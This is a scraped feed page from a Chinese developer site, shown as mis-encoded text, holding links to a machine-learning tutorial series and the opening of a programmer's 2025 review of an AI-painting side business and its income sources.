<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1985843315665556596" target="_blank" title="https://zhuanlan.zhihu.com/p/1985843315665556596" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„ä¼˜åŒ–æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986214900901631235" target="_blank" title="https://zhuanlan.zhihu.com/p/1986214900901631235" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­çš„å­¦ä¹ ç†è®º</a></p>
<h2 data-id="heading-1">æ•°æ®ä¸ç‰¹å¾å·¥ç¨‹</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986571005150393573" target="_blank" title="https://zhuanlan.zhihu.com/p/1986571005150393573" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­çš„æ•°æ®é¢„å¤„ç†æ–¹æ³•å¤§å…¨ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986937774515966052" target="_blank" title="https://zhuanlan.zhihu.com/p/1986937774515966052" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ç‰¹å¾å·¥ç¨‹ä¸­çš„ç‰¹å¾é€‰æ‹©</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1987286853355860184" target="_blank" title="https://zhuanlan.zhihu.com/p/1987286853355860184" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„ç‰¹å¾æ„é€ ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1987671291134775527" target="_blank" title="https://zhuanlan.zhihu.com/p/1987671291134775527" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„ç‰¹å¾é™ç»´ï¼</a></p>
<h2 data-id="heading-2">ç›‘ç£å­¦ä¹ æ–¹æ³•</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988209749930570714" target="_blank" title="https://zhuanlan.zhihu.com/p/1988209749930570714" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼å›å½’æ¨¡å‹æœ€å…¨è®²è§£ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988220820246528878" target="_blank" title="https://zhuanlan.zhihu.com/p/1988220820246528878" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ä¸€æ–‡ææ‡‚ç›‘ç£å­¦ä¹ ä¸­çš„åˆ†ç±»æ¨¡å‹ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988607240530310302" target="_blank" title="https://zhuanlan.zhihu.com/p/1988607240530310302" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æ ‘æ¨¡å‹ä¸é›†æˆæ¨¡å‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1989117049310573686" target="_blank" title="https://zhuanlan.zhihu.com/p/1989117049310573686" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚ç›‘ç£å­¦ä¹ ä¸­çš„é›†æˆå­¦ä¹ ï¼</a></p>
<h2 data-id="heading-3">æ— ç›‘ç£å­¦ä¹ æ–¹æ³•</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1989476470503016400" target="_blank" title="https://zhuanlan.zhihu.com/p/1989476470503016400" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚K-Means èšç±»ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1991660950718277623" target="_blank" title="https://zhuanlan.zhihu.com/p/1991660950718277623" ref="nofollow noopener noreferrer">K-Medoidsèšç±»æ–¹æ³•å’ŒK-Meansæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993096866754221035" target="_blank" title="https://zhuanlan.zhihu.com/p/1993096866754221035" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚å±‚æ¬¡èšç±»å’Œå¯†åº¦èšç±»æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993373759931954886" target="_blank" title="https://zhuanlan.zhihu.com/p/1993373759931954886" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„PCAä¸»æˆåˆ†åˆ†æï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993671061439549575" target="_blank" title="https://zhuanlan.zhihu.com/p/1993671061439549575" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­ç‹¬ç«‹æˆåˆ†åˆ†æICAå’Œä¸»æˆåˆ†åˆ†æPCAæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1994189802527014929" target="_blank" title="https://zhuanlan.zhihu.com/p/1994189802527014929" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚t-SNEå’ŒUMAPé™ç»´æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1994553416505116303" target="_blank" title="https://zhuanlan.zhihu.com/p/1994553416505116303" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„æ¦‚ç‡å›¾æ¨¡å‹</a></p>
<h2 data-id="heading-4">åŠç›‘ç£ä¸å¼ºåŒ–å­¦ä¹ </h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1995268800132686540" target="_blank" title="https://zhuanlan.zhihu.com/p/1995268800132686540" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­åŠç›‘ç£å­¦ä¹ çš„ç»å…¸æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1995612529041351227" target="_blank" title="https://zhuanlan.zhihu.com/p/1995612529041351227" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚å¼ºåŒ–å­¦ä¹ çš„åŸºç¡€çŸ¥è¯†ï¼</a></p>
<h2 data-id="heading-5">æ¨¡å‹è¯„ä¼°ä¸é€‰æ‹©</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1996228177396265403" target="_blank" title="https://zhuanlan.zhihu.com/p/1996228177396265403" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„æ•°æ®åˆ’åˆ†ä¸éªŒè¯æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1996724312397346362" target="_blank" title="https://zhuanlan.zhihu.com/p/1996724312397346362" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„åˆ†ç±»|å›å½’|èšç±»ä»»åŠ¡éƒ½æœ‰å“ªäº›å¸¸ç”¨çš„è¯„ä¼°æŒ‡æ ‡ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1997453295883674299" target="_blank" title="https://zhuanlan.zhihu.com/p/1997453295883674299" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­éƒ½æœ‰å“ªäº›ç»å…¸çš„æ¨¡å‹è°ƒä¼˜æ–¹æ³•ï¼Ÿ</a></p>
<p>æœ€æ–°çš„æ–‡ç« éƒ½åœ¨å…¬ä¼—å·aicotingæ›´æ–°ï¼Œåˆ«å¿˜è®°å…³æ³¨å“¦ï¼ï¼ï¼</p>
<p>ä½œè€…ï¼šcoting</p>
<p>åˆ†äº«æ˜¯ä¸€ç§ä¿¡ä»°ï¼Œè¿æ¥è®©æˆé•¿æ›´æœ‰æ¸©åº¦ã€‚</p>
<p>æˆ‘ä»¬ä¸‹æ¬¡ä¸è§ä¸æ•£ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¨‹åºå‘˜å‰¯ä¸š | 2025 å¹´åº¦å¤ç›˜ï½œä»ä¸ªäººèƒ½åŠ›ï¼Œåˆ°å¯æŒç»­å•†ä¸šç»“æ„çš„ä¸€å¹´]]></title>    <link>https://juejin.cn/post/7601028900886069294</link>    <guid>https://juejin.cn/post/7601028900886069294</guid>    <pubDate>2026-01-30T15:49:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601028900886069294" data-draft-id="7600982613653979186" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¨‹åºå‘˜å‰¯ä¸š | 2025 å¹´åº¦å¤ç›˜ï½œä»ä¸ªäººèƒ½åŠ›ï¼Œåˆ°å¯æŒç»­å•†ä¸šç»“æ„çš„ä¸€å¹´"/> <meta itemprop="keywords" content="åç«¯,åˆ›ä¸š"/> <meta itemprop="datePublished" content="2026-01-30T15:49:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å˜Ÿå˜ŸMD"/> <meta itemprop="url" content="https://juejin.cn/user/3368559354851470"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¨‹åºå‘˜å‰¯ä¸š | 2025 å¹´åº¦å¤ç›˜ï½œä»ä¸ªäººèƒ½åŠ›ï¼Œåˆ°å¯æŒç»­å•†ä¸šç»“æ„çš„ä¸€å¹´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559354851470/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å˜Ÿå˜ŸMD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:49:27.000Z" title="Fri Jan 30 2026 15:49:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2557cd7a86814ef8af74fe2f6ba77795~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=900&amp;h=383&amp;s=91599&amp;e=jpg&amp;b=64a5ef" alt="å¿…çœ‹å¤§å­—æœ€æ–°æ¶ˆæ¯é‡ç£…å…¬ä¼—å·é¦–å›¾(2) (1).jpg" loading="lazy"/></p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F5pCcN4c9RjOBtt0M-RUGaQ" target="_blank" title="https://mp.weixin.qq.com/s/5pCcN4c9RjOBtt0M-RUGaQ" ref="nofollow noopener noreferrer">å˜Ÿçˆ·åˆ›ä¸šæ—¥è®°</a>Â ã€‚ æˆ‘å·²ç»åšæŒæ—¥æ›´700å¤©+ï¼Œæ¬¢è¿è¿‡æ¥è¿½å‰§~</p>
</blockquote>
<p>æ—¶é—´ä¸€æ‹–å°±æœˆåº•äº†ï¼Œ 2025å¹´çš„å¹´åº¦å¤ç›˜å·®ç‚¹éš¾äº§ï¼Œä½†æ˜¯è¯¥å†™è¿˜æ˜¯è¦å†™ï¼Œå¯¹è‡ªå·±çš„ä¸€ä¸ªäº¤ä»£ï¼Œä¹Ÿæ˜¯å¯¹æ–°çš„ä¸€å¹´çš„æœŸå¾…ã€‚</p>
<p>å›çœ‹ 2025 å¹´ï¼Œæˆ‘æœ€å¤§çš„æ„Ÿå—ä¸æ˜¯â€œå¿™â€ï¼Œè€Œæ˜¯<strong>ç»ˆäºä¸å†è¿·èŒ«äº†</strong>ã€‚</p>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘æ²¡æœ‰è¿½é€æ–°çš„é£å£ï¼Œä¹Ÿæ²¡æœ‰å†é¢‘ç¹æ›´æ¢æ–¹å‘ï¼Œè€Œæ˜¯å›´ç»•å·²ç»éªŒè¯è¿‡çš„èƒ½åŠ›ï¼Œå¼€å§‹æ­å»ºå±äºè‡ªå·±çš„å•†ä¸šç»“æ„ã€‚</p>
<p>å¦‚æœç”¨ä¸€å¥è¯æ€»ç»“ 2025 å¹´ï¼Œé‚£å°±æ˜¯ï¼š</p>
<blockquote>
<p>è¿™æ˜¯æˆ‘æŠŠä¸ªäººèƒ½åŠ›ï¼ŒçœŸæ­£è½¬åŒ–ä¸ºå¯æŒç»­å•†ä¸šç³»ç»Ÿçš„ä¸€å¹´ã€‚</p>
</blockquote>
<p>ä¸‹é¢ä»å‡ ä¸ªå…³é”®æ¨¡å—ï¼Œç³»ç»Ÿæ€§åœ°å¤ç›˜è¿™ä¸€å¹´ï¼Œç”¨nanoåšçš„æ±‡æ€»æµ·æŠ¥çœŸä¸é”™~</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36d861b35b37467bb9a9c716cf38c72e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392966&amp;x-signature=GF5Ksv8G6ple8e%2FNl2JJowTlYYM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€2025å¹´ï¼Œæˆ‘åœ¨åšä»€ä¹ˆï¼Ÿ</h2>
<p>2025 å¹´ï¼Œæˆ‘åšçš„äº‹æƒ…çœ‹èµ·æ¥å¾ˆå¤šï¼Œä½†ä¸»çº¿å…¶å®éå¸¸æ¸…æ™°ï¼š</p>
<ul>
<li>
<p>å›´ç»•Â <strong>AI ç»˜ç”» / ComfyUI</strong>Â æŒç»­è¾“å‡ºå†…å®¹ï¼Œæ‰“é€ ä¸ªäºº IP</p>
</li>
<li>
<p>ä»å•ä¸€çº¿ä¸Šåˆ›ä½œè€…ï¼Œå»¶å±•åˆ°Â <strong>çº¿ä¸‹ç»„ç»‡ä¸å…¬å¸åŒ–å°è¯•</strong></p>
</li>
<li>
<p>ä¸ºä¸‹ä¸€é˜¶æ®µçš„Â <strong>äº§å“åŒ–ã€ç³»ç»ŸåŒ–ã€å¤åˆ©åŒ–</strong>Â åšå‡†å¤‡</p>
</li>
</ul>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘ä¸å†çº ç»“â€œè¦ä¸è¦åšè¿™ä¸ªé¡¹ç›®â€ï¼Œè€Œæ˜¯åœ¨ä¸æ–­é—®è‡ªå·±ï¼š</p>
<blockquote>
<p>è¿™ä»¶äº‹ï¼Œå€¼ä¸å€¼å¾—è¢«é•¿æœŸæ”¾å¤§ï¼Ÿ</p>
</blockquote>
<h2 data-id="heading-1">äºŒã€AI ç»˜ç”» IPï¼šçœŸæ­£è·‘é€šçš„ä¸€å¹´</h2>
<h4 data-id="heading-2">ä¸ŠåŠå¹´ï¼šä»¥æœåŠ¡å‹æ”¶å…¥ä¸ºä¸»</h4>
<p>2025 å¹´ä¸ŠåŠå¹´ï¼ŒAI ç»˜ç”»ç›¸å…³çš„æ”¶å…¥ï¼Œä¸»è¦æ¥è‡ªå’Œå½±è§†æœºæ„çš„åˆä½œåŸ¹è®­ï¼ŒåŒ…æ‹¬çº¿ä¸Šå’Œçº¿ä¸‹çš„çŸ­æœŸè¯¾ç¨‹ã€‚è¿™ç±»æ¨¡å¼çš„ç‰¹ç‚¹å¾ˆæ˜æ˜¾ï¼š</p>
<ul>
<li>æ”¶å…¥ç›¸å¯¹ç¨³å®š</li>
<li>ä½†å¼ºä¾èµ–æ—¶é—´</li>
<li>å¤©èŠ±æ¿æ¸…æ™°å¯è§</li>
</ul>
<p>å½“æ—¶æˆ‘å·²ç»æ„è¯†åˆ°ï¼Œè¿™å¹¶ä¸æ˜¯æˆ‘æƒ³é•¿æœŸä¾èµ–çš„å½¢æ€ã€‚</p>
<h4 data-id="heading-3">ä¸‹åŠå¹´ï¼šå†…å®¹ + IP çš„è½¬æŠ˜ç‚¹</h4>
<p>ä» 6 æœˆå¼€å§‹ï¼Œæˆ‘å¼€å§‹å’Œå¹³å°åˆä½œï¼Œå°è¯•ç”¨Â <strong>æ–‡ç«  + è§†é¢‘</strong>Â çš„æ–¹å¼æŒç»­è¾“å‡ºå†…å®¹ï¼Œå¹¶é€æ­¥å½¢æˆç»„åˆå‹æ”¶å…¥ç»“æ„ï¼š</p>
<ul>
<li>
<p>å¹³å°ç¨¿è´¹ä¸åˆ›ä½œè€…æ¿€åŠ±</p>
</li>
<li>
<p>å†…å®¹å¹³å°çš„åˆ›ä½œæ”¶ç›Š</p>
</li>
<li>
<p>åœ¨æ–‡ç« å’Œè§†é¢‘ä¸­è‡ªç„¶æ‰¿æ¥å·¥å…·ç±»ã€ç½‘ç›˜ç±»ç­‰é•¿æœŸåˆ†æˆ</p>
</li>
</ul>
<p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡éå¸¸æ¸…æ™°åœ°æ„Ÿå—åˆ°ï¼š</p>
<blockquote>
<p><strong>å†…å®¹ + IP + æ¸ é“ï¼Œæœ¬èº«å°±æ˜¯ä¸€ä¸ªå¯å¤åˆ©çš„ç”Ÿäº§ç³»ç»Ÿã€‚</strong></p>
</blockquote>
<p>å³ä½¿ä¸æ¥ä»»ä½•å•†å•ï¼Œè¿™å¥—ç»“æ„ä¹Ÿèƒ½ç¨³å®šè¿è½¬ã€‚<br/>
è€Œä¸€æ—¦å åŠ å•†å•æˆ–è½¯æ–‡åˆä½œï¼Œæ•´ä½“ä¸Šé™å°±ä¼šè¢«æ˜æ˜¾æ‹‰é«˜ã€‚</p>
<p>æ›´é‡è¦çš„æ˜¯ï¼Œè¿™ä¸€åˆ‡éƒ½å›´ç»•åŒä¸€ä¸ªå‚ç›´èµ›é“å±•å¼€ï¼Œæ²¡æœ‰åˆ†æ•£ç²¾åŠ›ï¼Œå¹¶ä¸”èƒ½å®ç°é—­ç¯çš„å¢é•¿é£è½®ï¼Œæ˜¯å¤åˆ©çš„ä¸€ç§ä½“ç°ã€‚</p>
<ul>
<li>ç›®å‰å…¬ä¼—å·ç²‰ä¸ï¼š12540</li>
<li>Bç«™ç²‰ä¸ï¼š7795</li>
<li>æ²¹ç®¡ï¼š2460</li>
</ul>
<p>æ˜å¹´å¤ç›˜çš„æ—¶å€™å†å›æ¥å¯¹æ¯”</p>
<h2 data-id="heading-4">ä¸‰ã€çº¿ä¸‹ç¦ AIï¼šä»å…¬ç›Šåˆ°å•†ä¸šåŒ–çš„æ¢ç´¢</h2>
<p>2025 å¹´ï¼Œæˆ‘å¹¶æ²¡æœ‰åªæŠŠé‡å¿ƒæ”¾åœ¨çº¿ä¸Šã€‚</p>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘ä»å‚ä¸Â <strong>ç¦ AI å…¬ç›Šç»„ç»‡</strong>Â å¼€å§‹ï¼Œé€æ­¥æ·±å…¥åˆ°çº¿ä¸‹ AI ç§‘æ™®ã€è¯¾ç¨‹åˆ†äº«ï¼Œå†åˆ°åæœŸæ¨åŠ¨å•†ä¸šåŒ–å°è¯•ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p>è§†é¢‘å®šåˆ¶</p>
</li>
<li>
<p>ä¼ä¸šåŸ¹è®­</p>
</li>
<li>
<p>å®šå‘çº¿ä¸‹è¯¾ç¨‹</p>
</li>
</ul>
<p>åˆ°äº† 2025 å¹´åº•ï¼Œæˆ‘ä»¬æ­£å¼æˆç«‹äº†å…¬å¸ï¼Œç”¨æ›´è§„èŒƒçš„æ–¹å¼æ‰¿æ¥çº¿ä¸‹ä¸šåŠ¡ã€‚</p>
<p>è¿™æ¡çº¿åœ¨ 2025 å¹´å¹¶ä¸æ˜¯â€œçˆ†å‘å‹æ”¶ç›Šâ€ï¼Œä½†å®ƒçš„æ„ä¹‰åœ¨äºï¼š</p>
<blockquote>
<p><strong>ä¸ºæœªæ¥æ›´å¤§çš„é¡¹ç›®æ‰¿æ¥èƒ½åŠ›ï¼Œæå‰æ­å»ºåŸºç¡€è®¾æ–½ã€‚</strong></p>
</blockquote>
<p>æˆ‘å¯¹çº¿ä¸‹å…¬å¸çš„å®šä½ä¹Ÿå¾ˆæ¸…æ™°ï¼šä¸æ˜¯è¿½æ±‚çŸ­æœŸè§„æ¨¡ï¼Œè€Œæ˜¯ä¸º 2026â€“2027 å¹´çš„ä¼ä¸šæœåŠ¡ã€é•¿æœŸåˆä½œæ‰“åŸºç¡€ã€‚</p>
<h2 data-id="heading-5">å››ã€æ”¶å…¥ç»“æ„çš„å˜åŒ–ï¼Œæ¯”æ•°å­—æ›´é‡è¦</h2>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘å¼€å§‹åˆ»æ„ä¸å†çº ç»“â€œèµšäº†å¤šå°‘â€ï¼Œè€Œæ˜¯è§‚å¯ŸÂ <strong>æ”¶å…¥ç»“æ„æ˜¯å¦å¥åº·</strong>ã€‚</p>
<p>æ•´ä½“æ¥çœ‹ï¼Œæ”¶å…¥æ¥æºé€æ¸å‘ˆç°å‡ºå‡ ä¸ªç‰¹ç‚¹ï¼š</p>
<ul>
<li>
<p>å†…å®¹å‹æ”¶å…¥ï¼šç¨³å®šã€å¯å¤åˆ¶ï¼Œæ˜¯åŸºç¡€ç°é‡‘æµ</p>
</li>
<li>
<p>æœåŠ¡å‹æ”¶å…¥ï¼šå•ä»·åœ¨æå‡ï¼Œä½†ä¸å†æ— é™æ¥å•</p>
</li>
<li>
<p>å•†å• / å¹¿å‘Šï¼šä¸ç¡®å®šï¼Œä½†ä½œä¸ºå¢é‡å­˜åœ¨</p>
</li>
<li>
<p>æ—§å‰¯ä¸šï¼šé€æ­¥é€€å‡ºï¼Œä¸å†ä½œä¸ºæ ¸å¿ƒæŠ•å…¥æ–¹å‘</p>
</li>
</ul>
